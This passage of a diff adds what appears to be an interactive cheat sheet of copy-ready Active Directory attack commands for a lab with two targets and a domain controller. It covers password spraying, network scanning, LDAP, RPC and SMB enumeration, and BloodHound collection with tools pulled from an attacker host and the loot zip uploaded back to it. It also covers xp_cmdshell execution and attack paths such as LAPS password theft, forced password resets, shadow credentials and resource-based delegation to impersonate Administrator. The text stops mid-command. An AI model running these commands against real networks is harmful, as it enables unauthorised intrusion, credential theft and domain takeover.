+for h in <span class="var" data-var="T1NAME">$T1NAME</span> <span class="var" data-var="T2NAME">$T2NAME</span> <span class="var m-dc" data-var="DCNAME">$DCNAME</span>; do nxc mssql "$h" --continue-on-success -u usernames.txt -p passwords.txt -d "$DOMAIN"; done
+for h in <span class="var" data-var="T1NAME">$T1NAME</span> <span class="var" data-var="T2NAME">$T2NAME</span> <span class="var m-dc" data-var="DCNAME">$DCNAME</span>; do nxc ldap  "$h" --continue-on-success -u usernames.txt -p passwords.txt -d "$DOMAIN"; done
+for h in <span class="var" data-var="T1NAME">$T1NAME</span> <span class="var" data-var="T2NAME">$T2NAME</span> <span class="var m-dc" data-var="DCNAME">$DCNAME</span>; do nxc rdp   "$h" --continue-on-success -u usernames.txt -p passwords.txt -d "$DOMAIN"; done</code></pre><button class="copy">COPY</button></div></div>
+    </div>
+  </details>
+
+  <section id="s-recon" class="blk">
+    <h2>0 · Recon &amp; pivoting</h2>
+    <div class="blk-body">
+      <h3 class="subhead-lite">Port scanning</h3>
+      <p class="hint">Quick pass — every port, fast</p><div class="cmd sh-kali"><div class="row"><pre><code>printf "[*] Target range (CIDR): "; read R; rustscan -a "$R" --ulimit 5000 -g</code></pre><button class="copy">COPY</button></div></div>
+      <p class="hint">Full TCP + service/version detection, one target</p><div class="cmd sh-kali"><div class="row"><pre><code>mkdir -p nmap &amp;&amp; printf "[*] Target IP: "; read T; grc nmap -p- -T4 -Pn --min-rate 5000 -oN nmap/all_ports.txt "$T" &amp;&amp; PORTS=$(grep open nmap/all_ports.txt | awk -F'/' '{print $1}' | paste -sd,) &amp;&amp; echo "[+] Ports: $PORTS" &amp;&amp; grc nmap -p "$PORTS" -sC -sV -T4 -Pn -oN nmap/scan.txt "$T"</code></pre><button class="copy">COPY</button></div></div>
+      <p class="hint">Same, across every host in a list</p><div class="cmd sh-kali"><div class="row"><pre><code>nmap -sCV -Pn -vv -iL ips.txt -oA nmap/initial</code></pre><button class="copy">COPY</button></div></div>
+      <p class="hint">Same again via rustscan instead</p><div class="cmd sh-kali"><div class="row"><pre><code>rustscan -a ips.txt --ulimit 5000 -- -sC -sV -oN nmap/rustscan_initial.txt</code></pre><button class="copy">COPY</button></div></div>
+      <p class="hint">UDP sweep</p><div class="cmd sh-kali"><div class="row"><pre><code>udpx -tf ips.txt</code></pre><button class="copy">COPY</button></div></div>
+      <h3 class="subhead-lite">Resolve hostnames</h3>
+      <p class="hint">Grab the DC's real hostname</p><div class="cmd sh-kali"><div class="row"><pre><code>nxc smb <span class="var m-dc" data-var="DC">$DC</span></code></pre><button class="copy">COPY</button></div></div>
+      <p class="hint">NetBIOS name, fallback if the above is empty</p><div class="cmd sh-kali"><div class="row"><pre><code>nmblookup -A <span class="var m-dc" data-var="DC">$DC</span></code></pre><button class="copy">COPY</button></div></div>
+      <p class="hint">Add DC + Target 1 + Target 2 to /etc/hosts — Kerberos and several tools get fussy about bare IPs</p><div class="cmd sh-kali"><div class="row"><pre><code>echo "<span class="var m-dc" data-var="DC">$DC</span> <span class="var m-dc" data-var="DCNAME">$DCNAME</span>.<span class="var" data-var="DOMAIN">$DOMAIN</span> <span class="var m-dc" data-var="DCNAME">$DCNAME</span>" | sudo tee -a /etc/hosts</code></pre><button class="copy">COPY</button></div></div><div class="cmd sh-kali"><div class="row"><pre><code>echo "<span class="var m-t1" data-var="T1">$T1</span> <span class="var" data-var="T1NAME">$T1NAME</span>.<span class="var" data-var="DOMAIN">$DOMAIN</span> <span class="var" data-var="T1NAME">$T1NAME</span>" | sudo tee -a /etc/hosts</code></pre><button class="copy">COPY</button></div></div><div class="cmd sh-kali"><div class="row"><pre><code>echo "<span class="var m-t2" data-var="T2">$T2</span> <span class="var" data-var="T2NAME">$T2NAME</span>.<span class="var" data-var="DOMAIN">$DOMAIN</span> <span class="var" data-var="T2NAME">$T2NAME</span>" | sudo tee -a /etc/hosts</code></pre><button class="copy">COPY</button></div></div>
+      <h3 class="subhead-lite">Pivot &amp; discover</h3>
+      <p class="hint">Pivoted in — ping sweep the internal subnet</p><div class="cmd sh-kali"><div class="row"><pre><code>nmap -sn <span class="var" data-var="SUBNET">$SUBNET</span></code></pre><button class="copy">COPY</button></div></div>
+      <p class="hint">Full scan on Target 1 from Kali, if routed</p><div class="cmdname" style="justify-content:flex-end"><div class="tgt-pick-wrap"><select class="tgt-pick" title="Which box is this targeting?"><option value="T1" selected>T1</option><option value="T2">T2</option><option value="DC">DC</option></select><button type="button" class="tgt-pick-btn" aria-haspopup="listbox" aria-expanded="false"><span class="tgt-pick-btn-label">T1</span></button><div class="tgt-pick-menu" role="listbox" aria-hidden="true"><div class="tgt-pick-opt sel" role="option" tabindex="0" data-value="T1" aria-selected="true">T1</div><div class="tgt-pick-opt" role="option" tabindex="0" data-value="T2">T2</div><div class="tgt-pick-opt" role="option" tabindex="0" data-value="DC">DC</div></div></div></div><div class="cmd sh-kali"><div class="row"><pre><code>rustscan -a <span class="var m-t1" data-var="T1" data-tgt-slot>$T1</span> -- -sC -sV -oN rustscan_t1.txt</code></pre><button class="copy">COPY</button></div></div>
+      <p class="hint">No route from Kali? Pull rustscan onto the box and scan Target 2 from there instead</p><div class="cmd sh-ps"><div class="row"><pre><code>iwr -uri http://<span class="var" data-var="KALI">$KALI</span>/rustscan.exe -outfile rustscan.exe</code></pre><button class="copy">COPY</button></div></div><div class="cmdname" style="justify-content:flex-end"><div class="tgt-pick-wrap"><select class="tgt-pick" title="Which box is this targeting?"><option value="T1">T1</option><option value="T2" selected>T2</option><option value="DC">DC</option></select><button type="button" class="tgt-pick-btn" aria-haspopup="listbox" aria-expanded="false"><span class="tgt-pick-btn-label">T2</span></button><div class="tgt-pick-menu" role="listbox" aria-hidden="true"><div class="tgt-pick-opt" role="option" tabindex="0" data-value="T1">T1</div><div class="tgt-pick-opt sel" role="option" tabindex="0" data-value="T2" aria-selected="true">T2</div><div class="tgt-pick-opt" role="option" tabindex="0" data-value="DC">DC</div></div></div></div><div class="cmd sh-ps"><div class="row"><pre><code>.\rustscan.exe -a <span class="var m-t2" data-var="T2" data-tgt-slot>$T2</span> -- -sC -sV</code></pre><button class="copy">COPY</button></div></div>
+    </div>
+  </section>
+
+  <section id="s-users" class="blk">
+    <h2>1 · Get users &amp; enumerate</h2>
+    <div class="blk-body">
+      <h3 class="subhead-lite">LDAP enumeration</h3>
+      <p class="hint">Base-DN dump — IP + base DN both live from the config panel</p><div class="cmd sh-kali"><div class="row"><pre><code>ldapsearch -x -H ldap://<span class="var m-dc" data-var="DC">$DC</span> -b "<span class="var" data-var="BASEDN">$BASEDN</span>"</code></pre><button class="copy">COPY</button></div></div>
+      <p class="hint">No base DN yet? Discover it for free</p><div class="cmd sh-kali"><div class="row"><pre><code>ldapsearch -x -H ldap://<span class="var m-dc" data-var="DC">$DC</span> -s base -b "" namingContexts</code></pre><button class="copy">COPY</button></div></div>
+      <p class="hint">Unconstrained-delegation accounts — any of these is worth coercing a DA auth onto</p><div class="cmd sh-kali"><div class="row"><pre><code>ldapsearch -x -H ldap://<span class="var m-dc" data-var="DC">$DC</span> -D '<span class="var" data-var="USER">$USER</span>@<span class="var" data-var="DOMAIN">$DOMAIN</span>' -w '<span class="var" data-var="PASS">$PASS</span>' -b "&lt;base-dn&gt;" "(userAccountControl:1.2.840.113556.1.4.803:=524288)" sAMAccountName</code></pre><button class="copy">COPY</button></div></div>
+      <p class="hint">Who's actually in Domain Admins right now</p><div class="cmd sh-kali"><div class="row"><pre><code>ldapsearch -x -H ldap://<span class="var m-dc" data-var="DC">$DC</span> -D '<span class="var" data-var="USER">$USER</span>@<span class="var" data-var="DOMAIN">$DOMAIN</span>' -w '<span class="var" data-var="PASS">$PASS</span>' -b "&lt;base-dn&gt;" "(&amp;(objectClass=group)(cn=Domain Admins))" member</code></pre><button class="copy">COPY</button></div></div>
+      <p class="hint">Null bind — often still works; --users also prints each description field (classic spot for a leaked password)</p><div class="cmd sh-kali"><div class="row"><pre><code>nxc ldap <span class="var m-dc" data-var="DC">$DC</span> -u '' -p '' --users</code></pre><button class="copy">COPY</button></div></div>
+      <p class="hint">Real creds? Whole domain in one shot</p><div class="cmd sh-kali"><div class="row"><pre><code>ldapdomaindump -u '<span class="var" data-var="DOMAIN">$DOMAIN</span>\<span class="var" data-var="USER">$USER</span>' -p '<span class="var" data-var="PASS">$PASS</span>' <span class="var m-dc" data-var="DC">$DC</span> -o ldap/</code></pre><button class="copy">COPY</button></div></div>
+      <p class="hint">...then open the .html reports it writes, not the raw json/grep — same data, way easier to read</p><div class="cmd sh-kali"><div class="row"><pre><code>firefox ldap/domain_users.html</code></pre><button class="copy">COPY</button></div></div>
+      <h3 class="subhead-lite">Username enumeration</h3>
+      <p class="hint">-all matters: without it, this only lists accounts with a mail attribute set — empty output on most lab domains</p><div class="cmd sh-kali"><div class="row"><pre><code>impacket-GetADUsers <span class="var" data-var="DOMAIN">$DOMAIN</span>/<span class="var" data-var="USER">$USER</span>:<span class="var" data-var="PASS">$PASS</span> -dc-ip <span class="var m-dc" data-var="DC">$DC</span> -all</code></pre><button class="copy">COPY</button></div></div>
+      <p class="hint">Straight to usernames.txt for the spray later</p><div class="cmd sh-kali"><div class="row"><pre><code>nxc smb <span class="var m-dc" data-var="DC">$DC</span> -u '<span class="var" data-var="USER">$USER</span>' -p '<span class="var" data-var="PASS">$PASS</span>' --users-export usernames.txt</code></pre><button class="copy">COPY</button></div></div>
+      <h3 class="subhead-lite">BloodHound collection</h3>
+      <p class="hint">Serve SharpHound.exe from Kali</p><div class="cmd sh-kali"><div class="row"><pre><code>python3 -m http.server 80 --directory /usr/share/sharphound</code></pre><button class="copy">COPY</button></div></div>
+      <p class="hint">Pull it and run it with the current session's creds</p><div class="cmd sh-ps"><div class="row"><pre><code>iwr -uri http://<span class="var" data-var="KALI">$KALI</span>/SharpHound.exe -outfile SharpHound.exe</code></pre><button class="copy">COPY</button></div></div><div class="cmd sh-ps"><div class="row"><pre><code>.\SharpHound.exe -c All --zipfilename loot.zip</code></pre><button class="copy">COPY</button></div></div>
+      <p class="hint">...or hand it explicit creds instead of the session you landed in</p><div class="cmd sh-ps"><div class="row"><pre><code>.\SharpHound.exe -c All --zipfilename loot.zip --Domain <span class="var" data-var="DOMAIN">$DOMAIN</span> --LdapUsername <span class="var" data-var="USER">$USER</span> --LdapPassword '<span class="var" data-var="PASS">$PASS</span>'</code></pre><button class="copy">COPY</button></div></div>
+      <p class="hint">.ps1 version instead of the .exe, same collection</p><div class="cmd sh-ps"><div class="row"><pre><code>iwr -uri http://<span class="var" data-var="KALI">$KALI</span>/SharpHound.ps1 -outfile SharpHound.ps1</code></pre><button class="copy">COPY</button></div></div><div class="cmd sh-ps"><div class="row"><pre><code>. .\SharpHound.ps1</code></pre><button class="copy">COPY</button></div></div><div class="cmd sh-ps"><div class="row"><pre><code>Invoke-BloodHound -CollectionMethod All -ZipFileName loot.zip</code></pre><button class="copy">COPY</button></div></div>
+      <p class="hint">Confirm the zip actually landed before you go hunting for it</p><div class="cmd sh-cmd"><div class="row"><pre><code>dir /b *.zip</code></pre><button class="copy">COPY</button></div></div>
+      <p class="hint">Get it back to Kali — spin up a receiver...</p><div class="cmd sh-kali"><div class="row"><pre><code>python3 -m uploadserver 8000</code></pre><button class="copy">COPY</button></div></div>
+      <p class="hint">...then push the zip from the target</p><div class="cmd sh-cmd"><div class="row"><pre><code>curl.exe -X POST http://<span class="var" data-var="KALI">$KALI</span>:8000/upload -F "files=@loot.zip"</code></pre><button class="copy">COPY</button></div></div>
+      <p class="hint">Or skip Windows collection entirely — pull straight from Kali with just creds</p><div class="cmd sh-kali"><div class="row"><pre><code>bloodhound-ce-python -c All -u '<span class="var" data-var="USER">$USER</span>' -p '<span class="var" data-var="PASS">$PASS</span>' -d <span class="var" data-var="DOMAIN">$DOMAIN</span> -ns <span class="var m-dc" data-var="DC">$DC</span> --zip</code></pre><button class="copy">COPY</button></div></div>
+      <div class="g"><span class="k">BLOODHOUND · PLAIN USER LIST</span><p>Cypher tab → <code class="inl">MATCH (m:User) RETURN m</code> → export the results to CSV (one <code class="inl">name@domain</code> per line). Strip the domain suffix for a clean list:</p></div><div class="cmd sh-kali"><div class="row"><pre><code>sed -i 's/@<span class="var" data-var="DOMAIN">$DOMAIN</span>$//' nodes.csv</code></pre><button class="copy">COPY</button></div></div>
+      <h3 class="subhead-lite">SMB shares</h3>
+      <p class="hint">Shares + your access level, color-coded live in your terminal</p><div class="cmdname" style="justify-content:flex-end"><div class="tgt-pick-wrap"><select class="tgt-pick" title="Which box is this targeting?"><option value="T1" selected>T1</option><option value="T2">T2</option><option value="DC">DC</option></select><button type="button" class="tgt-pick-btn" aria-haspopup="listbox" aria-expanded="false"><span class="tgt-pick-btn-label">T1</span></button><div class="tgt-pick-menu" role="listbox" aria-hidden="true"><div class="tgt-pick-opt sel" role="option" tabindex="0" data-value="T1" aria-selected="true">T1</div><div class="tgt-pick-opt" role="option" tabindex="0" data-value="T2">T2</div><div class="tgt-pick-opt" role="option" tabindex="0" data-value="DC">DC</div></div></div></div><div class="cmd sh-kali"><div class="row"><pre><code>nxc smb <span class="var m-t1" data-var="T1" data-tgt-slot>$T1</span> -u '<span class="var" data-var="USER">$USER</span>' -p '<span class="var" data-var="PASS">$PASS</span>' -d <span class="var" data-var="DOMAIN">$DOMAIN</span> --shares</code></pre><button class="copy">COPY</button></div></div>
+      <p class="hint">Same, as an explicit READ/WRITE/NO-ACCESS table</p><div class="cmdname" style="justify-content:flex-end"><div class="tgt-pick-wrap"><select class="tgt-pick" title="Which box is this targeting?"><option value="T1" selected>T1</option><option value="T2">T2</option><option value="DC">DC</option></select><button type="button" class="tgt-pick-btn" aria-haspopup="listbox" aria-expanded="false"><span class="tgt-pick-btn-label">T1</span></button><div class="tgt-pick-menu" role="listbox" aria-hidden="true"><div class="tgt-pick-opt sel" role="option" tabindex="0" data-value="T1" aria-selected="true">T1</div><div class="tgt-pick-opt" role="option" tabindex="0" data-value="T2">T2</div><div class="tgt-pick-opt" role="option" tabindex="0" data-value="DC">DC</div></div></div></div><div class="cmd sh-kali"><div class="row"><pre><code>smbmap -H <span class="var m-t1" data-var="T1" data-tgt-slot>$T1</span> -u '<span class="var" data-var="USER">$USER</span>' -p '<span class="var" data-var="PASS">$PASS</span>' -d <span class="var" data-var="DOMAIN">$DOMAIN</span></code></pre><button class="copy">COPY</button></div></div>
+      <p class="hint">List every share on a host, creds inline</p><div class="cmdname" style="justify-content:flex-end"><div class="tgt-pick-wrap"><select class="tgt-pick" title="Which box is this targeting?"><option value="T1" selected>T1</option><option value="T2">T2</option><option value="DC">DC</option></select><button type="button" class="tgt-pick-btn" aria-haspopup="listbox" aria-expanded="false"><span class="tgt-pick-btn-label">T1</span></button><div class="tgt-pick-menu" role="listbox" aria-hidden="true"><div class="tgt-pick-opt sel" role="option" tabindex="0" data-value="T1" aria-selected="true">T1</div><div class="tgt-pick-opt" role="option" tabindex="0" data-value="T2">T2</div><div class="tgt-pick-opt" role="option" tabindex="0" data-value="DC">DC</div></div></div></div><div class="cmd sh-kali"><div class="row"><pre><code>smbclient -L //<span class="var m-t1" data-var="T1" data-tgt-slot>$T1</span>/ -U <span class="var" data-var="DOMAIN">$DOMAIN</span>/<span class="var" data-var="USER">$USER</span>%<span class="var" data-var="PASS">$PASS</span></code></pre><button class="copy">COPY</button></div></div>
+      <p class="hint">Browse a share interactively</p><div class="cmdname" style="justify-content:flex-end"><div class="tgt-pick-wrap"><select class="tgt-pick" title="Which box is this targeting?"><option value="T1" selected>T1</option><option value="T2">T2</option><option value="DC">DC</option></select><button type="button" class="tgt-pick-btn" aria-haspopup="listbox" aria-expanded="false"><span class="tgt-pick-btn-label">T1</span></button><div class="tgt-pick-menu" role="listbox" aria-hidden="true"><div class="tgt-pick-opt sel" role="option" tabindex="0" data-value="T1" aria-selected="true">T1</div><div class="tgt-pick-opt" role="option" tabindex="0" data-value="T2">T2</div><div class="tgt-pick-opt" role="option" tabindex="0" data-value="DC">DC</div></div></div></div><div class="cmd sh-kali"><div class="row"><pre><code>smbclient //<span class="var m-t1" data-var="T1" data-tgt-slot>$T1</span>/&lt;share&gt; -U <span class="var" data-var="DOMAIN">$DOMAIN</span>/<span class="var" data-var="USER">$USER</span></code></pre><button class="copy">COPY</button></div></div>
+      <p class="hint">...skip the password prompt</p><div class="cmdname" style="justify-content:flex-end"><div class="tgt-pick-wrap"><select class="tgt-pick" title="Which box is this targeting?"><option value="T1" selected>T1</option><option value="T2">T2</option><option value="DC">DC</option></select><button type="button" class="tgt-pick-btn" aria-haspopup="listbox" aria-expanded="false"><span class="tgt-pick-btn-label">T1</span></button><div class="tgt-pick-menu" role="listbox" aria-hidden="true"><div class="tgt-pick-opt sel" role="option" tabindex="0" data-value="T1" aria-selected="true">T1</div><div class="tgt-pick-opt" role="option" tabindex="0" data-value="T2">T2</div><div class="tgt-pick-opt" role="option" tabindex="0" data-value="DC">DC</div></div></div></div><div class="cmd sh-kali"><div class="row"><pre><code>smbclient //<span class="var m-t1" data-var="T1" data-tgt-slot>$T1</span>/&lt;share&gt; -U <span class="var" data-var="DOMAIN">$DOMAIN</span>/<span class="var" data-var="USER">$USER</span>%<span class="var" data-var="PASS">$PASS</span></code></pre><button class="copy">COPY</button></div></div>
+      <p class="hint">Recurse a share without the interactive session — C$/ADMIN$ included if you have rights</p><div class="cmdname" style="justify-content:flex-end"><div class="tgt-pick-wrap"><select class="tgt-pick" title="Which box is this targeting?"><option value="T1" selected>T1</option><option value="T2">T2</option><option value="DC">DC</option></select><button type="button" class="tgt-pick-btn" aria-haspopup="listbox" aria-expanded="false"><span class="tgt-pick-btn-label">T1</span></button><div class="tgt-pick-menu" role="listbox" aria-hidden="true"><div class="tgt-pick-opt sel" role="option" tabindex="0" data-value="T1" aria-selected="true">T1</div><div class="tgt-pick-opt" role="option" tabindex="0" data-value="T2">T2</div><div class="tgt-pick-opt" role="option" tabindex="0" data-value="DC">DC</div></div></div></div><div class="cmd sh-kali"><div class="row"><pre><code>smbmap -H <span class="var m-t1" data-var="T1" data-tgt-slot>$T1</span> -u '<span class="var" data-var="USER">$USER</span>' -p '<span class="var" data-var="PASS">$PASS</span>' -d <span class="var" data-var="DOMAIN">$DOMAIN</span> -r &lt;share&gt; --depth 3</code></pre><button class="copy">COPY</button></div></div>
+      <h3 class="subhead-lite">RPC enumeration</h3>
+      <p class="hint">Null session — free, costs nothing to try first</p><div class="cmd sh-kali"><div class="row"><pre><code>rpcclient -U "" -N //<span class="var m-dc" data-var="DC">$DC</span></code></pre><button class="copy">COPY</button></div></div>
+      <p class="hint">One-shot: users, groups, domain info, password policy, all in one command</p><div class="cmd sh-kali"><div class="row"><pre><code>rpcclient -U "" -N //<span class="var m-dc" data-var="DC">$DC</span> -c "enumdomusers; enumdomgroups; querydominfo; getdompwinfo"</code></pre><button class="copy">COPY</button></div></div>
+      <p class="hint">Same, authenticated — usually opens up a lot more</p><div class="cmd sh-kali"><div class="row"><pre><code>rpcclient -U '<span class="var" data-var="DOMAIN">$DOMAIN</span>/<span class="var" data-var="USER">$USER</span>%<span class="var" data-var="PASS">$PASS</span>' //<span class="var m-dc" data-var="DC">$DC</span></code></pre><button class="copy">COPY</button></div></div>
+      <p class="hint">Full detail on one account, by the RID enumdomusers just printed</p><div class="cmd sh-kali"><div class="row"><pre><code>rpcclient -U "" -N //<span class="var m-dc" data-var="DC">$DC</span> -c "queryuser 0x&lt;RID&gt;"</code></pre><button class="copy">COPY</button></div></div>
+      <p class="hint">RID 500 is always the built-in Administrator, even renamed — confirms the domain SID too</p><div class="cmd sh-kali"><div class="row"><pre><code>rpcclient -U "" -N //<span class="var m-dc" data-var="DC">$DC</span> -c "lookupsids S-1-5-21-&lt;domain-sid&gt;-500"</code></pre><button class="copy">COPY</button></div></div>
+      <p class="hint">Other direction — name to SID</p><div class="cmd sh-kali"><div class="row"><pre><code>rpcclient -U "" -N //<span class="var m-dc" data-var="DC">$DC</span> -c "lookupnames <span class="var" data-var="USER">$USER</span>"</code></pre><button class="copy">COPY</button></div></div>
+      <p class="hint">RID-brute-forcing wrapper, one command instead of hand-cycling</p><div class="cmd sh-kali"><div class="row"><pre><code>impacket-lookupsid <span class="var" data-var="DOMAIN">$DOMAIN</span>/<span class="var" data-var="USER">$USER</span>:<span class="var" data-var="PASS">$PASS</span>@<span class="var m-dc" data-var="DC">$DC</span></code></pre><button class="copy">COPY</button></div></div>
+      <h3 class="subhead-lite">Database access</h3>
+      <p class="hint">MSSQL login</p><div class="cmdname" style="justify-content:flex-end"><div class="tgt-pick-wrap"><select class="tgt-pick" title="Which box is this targeting?"><option value="T1" selected>T1</option><option value="T2">T2</option><option value="DC">DC</option></select><button type="button" class="tgt-pick-btn" aria-haspopup="listbox" aria-expanded="false"><span class="tgt-pick-btn-label">T1</span></button><div class="tgt-pick-menu" role="listbox" aria-hidden="true"><div class="tgt-pick-opt sel" role="option" tabindex="0" data-value="T1" aria-selected="true">T1</div><div class="tgt-pick-opt" role="option" tabindex="0" data-value="T2">T2</div><div class="tgt-pick-opt" role="option" tabindex="0" data-value="DC">DC</div></div></div></div><div class="cmd sh-kali"><div class="row"><pre><code>impacket-mssqlclient <span class="var" data-var="DOMAIN">$DOMAIN</span>/<span class="var" data-var="USER">$USER</span>:<span class="var" data-var="PASS">$PASS</span>@<span class="var m-t1" data-var="T1" data-tgt-slot>$T1</span> -windows-auth</code></pre><button class="copy">COPY</button></div></div>
+      <p class="hint">sysadmin on the SQL login? Command exec via xp_cmdshell</p><div class="cmd sh-kali"><div class="row"><pre><code>enable_xp_cmdshell</code></pre><button class="copy">COPY</button></div></div><div class="cmd sh-kali"><div class="row"><pre><code>xp_cmdshell whoami</code></pre><button class="copy">COPY</button></div></div>
+      <p class="hint">MySQL login, then list databases</p><div class="cmdname" style="justify-content:flex-end"><div class="tgt-pick-wrap"><select class="tgt-pick" title="Which box is this targeting?"><option value="T1" selected>T1</option><option value="T2">T2</option><option value="DC">DC</option></select><button type="button" class="tgt-pick-btn" aria-haspopup="listbox" aria-expanded="false"><span class="tgt-pick-btn-label">T1</span></button><div class="tgt-pick-menu" role="listbox" aria-hidden="true"><div class="tgt-pick-opt sel" role="option" tabindex="0" data-value="T1" aria-selected="true">T1</div><div class="tgt-pick-opt" role="option" tabindex="0" data-value="T2">T2</div><div class="tgt-pick-opt" role="option" tabindex="0" data-value="DC">DC</div></div></div></div><div class="cmd sh-kali"><div class="row"><pre><code>mysql -u <span class="var" data-var="USER">$USER</span> -p -h <span class="var m-t1" data-var="T1" data-tgt-slot>$T1</span> --skip-ssl</code></pre><button class="copy">COPY</button></div></div><div class="cmdname" style="justify-content:flex-end"><div class="tgt-pick-wrap"><select class="tgt-pick" title="Which box is this targeting?"><option value="T1" selected>T1</option><option value="T2">T2</option><option value="DC">DC</option></select><button type="button" class="tgt-pick-btn" aria-haspopup="listbox" aria-expanded="false"><span class="tgt-pick-btn-label">T1</span></button><div class="tgt-pick-menu" role="listbox" aria-hidden="true"><div class="tgt-pick-opt sel" role="option" tabindex="0" data-value="T1" aria-selected="true">T1</div><div class="tgt-pick-opt" role="option" tabindex="0" data-value="T2">T2</div><div class="tgt-pick-opt" role="option" tabindex="0" data-value="DC">DC</div></div></div></div><div class="cmd sh-kali"><div class="row"><pre><code>mysql -u <span class="var" data-var="USER">$USER</span> -p -h <span class="var m-t1" data-var="T1" data-tgt-slot>$T1</span> --skip-ssl -e "SHOW DATABASES;"</code></pre><button class="copy">COPY</button></div></div>
+      <p class="hint">PostgreSQL login</p><div class="cmdname" style="justify-content:flex-end"><div class="tgt-pick-wrap"><select class="tgt-pick" title="Which box is this targeting?"><option value="T1" selected>T1</option><option value="T2">T2</option><option value="DC">DC</option></select><button type="button" class="tgt-pick-btn" aria-haspopup="listbox" aria-expanded="false"><span class="tgt-pick-btn-label">T1</span></button><div class="tgt-pick-menu" role="listbox" aria-hidden="true"><div class="tgt-pick-opt sel" role="option" tabindex="0" data-value="T1" aria-selected="true">T1</div><div class="tgt-pick-opt" role="option" tabindex="0" data-value="T2">T2</div><div class="tgt-pick-opt" role="option" tabindex="0" data-value="DC">DC</div></div></div></div><div class="cmd sh-kali"><div class="row"><pre><code>psql -h <span class="var m-t1" data-var="T1" data-tgt-slot>$T1</span> -U <span class="var" data-var="USER">$USER</span></code></pre><button class="copy">COPY</button></div></div>
+    </div>
+  </section>
+
+  <section id="s-edges" class="blk">
+    <h2>BloodHound edge &rarr; exploit</h2>
+    <div class="blk-body">
+      <div class="g"><span class="k">LAPS</span><p>Check it resolves, then pull the actual password:</p></div><div class="cmd sh-kali"><div class="row"><pre><code>nxc ldap <span class="var m-dc" data-var="DC">$DC</span> -d <span class="var" data-var="DOMAIN">$DOMAIN</span> -u '<span class="var" data-var="USER">$USER</span>' -p '<span class="var" data-var="PASS">$PASS</span>' -M laps</code></pre><button class="copy">COPY</button></div></div><div class="cmd sh-kali"><div class="row"><pre><code>bloodyAD --host <span class="var m-dc" data-var="DC">$DC</span> -d <span class="var" data-var="DOMAIN">$DOMAIN</span> -u '<span class="var" data-var="USER">$USER</span>' -p '<span class="var" data-var="PASS">$PASS</span>' get search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime</code></pre><button class="copy">COPY</button></div></div>
+      <div class="g"><span class="k">Group add</span><p>GenericWrite/Self on a group — add yourself directly:</p></div><div class="cmd sh-kali"><div class="row"><pre><code>bloodyAD --host <span class="var m-dc" data-var="DC">$DC</span> -d <span class="var" data-var="DOMAIN">$DOMAIN</span> -u '<span class="var" data-var="USER">$USER</span>' -p '<span class="var" data-var="PASS">$PASS</span>' add groupMember '&lt;target-group&gt;' '<span class="var" data-var="USER">$USER</span>'</code></pre><button class="copy">COPY</button></div></div>
+      <div class="g"><span class="k">Password reset</span><p>ForceChangePassword — set it directly, no old password needed:</p></div><div class="cmd sh-kali"><div class="row"><pre><code>bloodyAD --host <span class="var m-dc" data-var="DC">$DC</span> -d <span class="var" data-var="DOMAIN">$DOMAIN</span> -u '<span class="var" data-var="USER">$USER</span>' -p '<span class="var" data-var="PASS">$PASS</span>' set password '&lt;target-user&gt;' 'NewPassword123!'</code></pre><button class="copy">COPY</button></div></div>
+      <div class="g"><span class="k">WriteOwner</span><p>Take ownership of the target object:</p></div><div class="cmd sh-kali"><div class="row"><pre><code>bloodyAD --host <span class="var m-dc" data-var="DC">$DC</span> -d <span class="var" data-var="DOMAIN">$DOMAIN</span> -u '<span class="var" data-var="USER">$USER</span>' -p '<span class="var" data-var="PASS">$PASS</span>' set owner '&lt;target&gt;' '<span class="var" data-var="USER">$USER</span>'</code></pre><button class="copy">COPY</button></div></div>
+      <div class="g"><span class="k">GenericAll</span><p>Same idea for WriteDACL too — full control, grant yourself rights directly:</p></div><div class="cmd sh-kali"><div class="row"><pre><code>bloodyAD --host <span class="var m-dc" data-var="DC">$DC</span> -d <span class="var" data-var="DOMAIN">$DOMAIN</span> -u '<span class="var" data-var="USER">$USER</span>' -p '<span class="var" data-var="PASS">$PASS</span>' add genericAll '&lt;target&gt;' '<span class="var" data-var="USER">$USER</span>'</code></pre><button class="copy">COPY</button></div></div>
+      <div class="g"><span class="k">Shadow creds</span><p>Add a cert, get a TGT, no password change at all:</p></div><div class="cmd sh-kali"><div class="row"><pre><code>bloodyAD --host <span class="var m-dc" data-var="DC">$DC</span> -d <span class="var" data-var="DOMAIN">$DOMAIN</span> -u '<span class="var" data-var="USER">$USER</span>' -p '<span class="var" data-var="PASS">$PASS</span>' add shadowCredentials '&lt;target&gt;' --path ./loot</code></pre><button class="copy">COPY</button></div></div><div class="cmdname" style="justify-content:flex-end"><div class="tgt-pick-wrap"><select class="tgt-pick" title="Which box is this targeting?"><option value="T1">T1</option><option value="T2" selected>T2</option><option value="DC">DC</option></select><button type="button" class="tgt-pick-btn" aria-haspopup="listbox" aria-expanded="false"><span class="tgt-pick-btn-label">T2</span></button><div class="tgt-pick-menu" role="listbox" aria-hidden="true"><div class="tgt-pick-opt" role="option" tabindex="0" data-value="T1">T1</div><div class="tgt-pick-opt sel" role="option" tabindex="0" data-value="T2" aria-selected="true">T2</div><div class="tgt-pick-opt" role="option" tabindex="0" data-value="DC">DC</div></div></div></div><div class="cmd sh-kali"><div class="row"><pre><code>export KRB5CCNAME=./loot/&lt;target&gt;.ccache &amp;&amp; impacket-wmiexec -k -no-pass <span class="var" data-var="DOMAIN">$DOMAIN</span>/&lt;target&gt;@<span class="var m-t2" data-var="T2" data-tgt-slot>$T2</span></code></pre><button class="copy">COPY</button></div></div>
+      <div class="g"><span class="k">RBCD</span><p>Add a computer you control, delegate to it, get a ticket as Administrator, use it:</p></div><div class="cmd sh-kali"><div class="row"><pre><code>impacket-addcomputer <span class="var" data-var="DOMAIN">$DOMAIN</span>/<span class="var" data-var="USER">$USER</span>:<span class="var" data-var="PASS">$PASS</span> -computer-name 'PWNED$' -computer-pass 'Passw0rd123!' -dc-ip <span class="var m-dc" data-var="DC">$DC</span></code></pre><button class="copy">COPY</button></div></div><div class="cmd sh-kali"><div class="row"><pre><code>bloodyAD --host <span class="var m-dc" data-var="DC">$DC</span> -d <span class="var" data-var="DOMAIN">$DOMAIN</span> -u '<span class="var" data-var="USER">$USER</span>' -p '<span class="var" data-var="PASS">$PASS</span>' add rbcd '&lt;target-computer$&gt;' 'PWNED$'</code></pre><button class="copy">COPY</button></div></div><div class="cmd sh-kali"><div class="row"><pre><code>impacket-getST -spn cifs/&lt;target-hostname&gt; -impersonate Administrator '<span class="var" data-var="DOMAIN">$DOMAIN</span>/PWNED$:Passw0rd123!' -dc-ip <span class="var m-dc" 